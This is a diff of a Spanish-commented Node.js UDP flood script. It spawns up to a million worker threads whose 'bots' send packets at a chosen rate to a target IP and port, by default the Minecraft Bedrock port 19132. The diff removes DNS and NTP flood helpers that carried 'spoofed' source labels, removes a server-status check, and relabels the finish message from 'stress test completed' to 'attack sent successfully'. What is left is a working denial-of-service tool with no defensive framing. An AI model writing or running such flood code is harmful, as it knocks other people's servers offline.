@@ -1,8 +1,7 @@
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
+const { Worker, isMainThread, workerData } = require('worker_threads');
 const dgram = require('dgram');
 
 if (isMainThread) {
-    // Código principal
     const args = process.argv.slice(2);
     const serverAddress = args[0] || '127.0.0.1'; // IP del servidor
     const serverPort = parseInt(args[1], 10) || 19132; // Puerto del servidor
@@ -12,12 +11,9 @@ if (isMainThread) {
     const numThreads = parseInt(args[5], 10) || 1000000; // Número de hilos (hasta 1M de hilos)
 
     for (let i = 0; i < numThreads; i++) {
-        new Worker(__filename, {
-            workerData: { serverAddress, serverPort, numBots, pps, duration }
-        });
+        new Worker(__filename, { workerData: { serverAddress, serverPort, numBots, pps, duration } });
     }
 } else {
-    // Código del trabajador
     const { serverAddress, serverPort, numBots, pps, duration } = workerData;
     const udpClient = dgram.createSocket('udp4');
 
@@ -37,54 +33,10 @@ if (isMainThread) {
         });
     }
 
-    function sendDnsPacket(botId, packetId) {
-        const spoofedIp = getRandomIp();
-        const message = Buffer.from(`Bot ${botId} - Paquete DNS ${packetId} desde ${spoofedIp}`);
-        udpClient.send(message, 0, message.length, 53, serverAddress, (err) => {
-            if (err) {
-                console.error(`Bot ${botId}: Error al enviar paquete DNS ${packetId} - ${err.message}`);
-            } else {
-                console.log(`Bot ${botId}: Enviando paquete DNS ${packetId} desde ${spoofedIp} a ${serverAddress}:53`);
-            }
-        });
-    }
-
-    function sendNtpPacket(botId, packetId) {
-        const spoofedIp = getRandomIp();
-        const message = Buffer.from(`Bot ${botId} - Paquete NTP ${packetId} desde ${spoofedIp}`);
-        udpClient.send(message, 0, message.length, 123, serverAddress, (err) => {
-            if (err) {
-                console.error(`Bot ${botId}: Error al enviar paquete NTP ${packetId} - ${err.message}`);
-            } else {
-                console.log(`Bot ${botId}: Enviando paquete NTP ${packetId} desde ${spoofedIp} a ${serverAddress}:123`);
-            }
-        });
-    }
-
-    function checkServerStatus() {
-        const message = Buffer.from('Ping');
-        udpClient.send(message, 0, message.length, serverPort, serverAddress, (err) => {
-            if (err) {
-                console.error(`Error al verificar el estado del servidor: ${err.message}`);
-            }
-        });
-
-        udpClient.once('message', (msg) => {
-            console.log(`Servidor responde: ${msg.toString()}`);
-        });
-
-        setTimeout(() => {
-            console.error('El servidor está offline o ha crasheado.');
-            process.exit(1);
-        }, 5000); // Espera 5 segundos para la respuesta del servidor
-    }
-
     for (let botId = 0; botId < numBots; botId++) {
         let packetId = 0;
         const interval = setInterval(() => {
             sendUdpPacket(botId, packetId);
-            sendDnsPacket(botId, packetId);
-            sendNtpPacket(botId, packetId);
             packetId++;
         }, 1000 / pps);
 
@@ -92,10 +44,8 @@ if (isMainThread) {
             clearInterval(interval);
             if (botId === numBots - 1) {
                 udpClient.close();
-                console.log("Prueba de estrés completada.");
+                console.log("Ataque Enviado Correctamente y expirado");
             }
         }, duration * 1000);
     }
-
-    setInterval(checkServerStatus, 10000); // Verifica el estado del servidor cada 10 segundos
 }
